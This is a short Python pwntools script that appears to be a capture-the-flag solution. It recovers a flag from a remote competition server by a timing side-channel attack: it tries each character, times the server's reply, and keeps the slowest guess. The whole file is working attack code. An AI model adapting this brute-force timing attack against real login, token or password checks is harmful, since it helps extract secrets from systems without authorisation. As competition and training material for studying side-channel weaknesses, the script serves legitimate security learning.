from pwn import *
import time
import datetime

charset = string.ascii_lowercase+string.digits+'{'+'}'+'_'

flag = b'uscg{'

while True:
    if b'}' in flag:
        break

    candidate_chars = {}
    for candidate in charset:

        #p = remote('0.cloud.chals.io',29427)
        p = remote('0.cloud.chals.io', 15346)
        #p = remote('0.cloud.chals.io',27198)
        p.recvuntil(b'>>>')

        try:
            test_flag = flag+candidate.encode()
            dt1 = datetime.datetime.now()
            p.sendline(test_flag)
            response = p.recvuntil(b'[')
            dt2 = datetime.datetime.now()
            tdiff = dt2-dt1
            candidate_chars[candidate] = tdiff.total_seconds()
            info("Tried: %s Time Diff: %2.5f" %
                 (test_flag, tdiff.total_seconds()))
        except:
            info("Tried: %s No Response." % (test_flag))

    print(candidate_chars)
    inverse = [(value, key) for key, value in candidate_chars.items()]
    max_candidate = max(inverse)[1]
    flag = flag+max_candidate.encode()
    info("Discovered Next Char: %s" % flag)

info("Congrats you found the flag: %s" % flag)
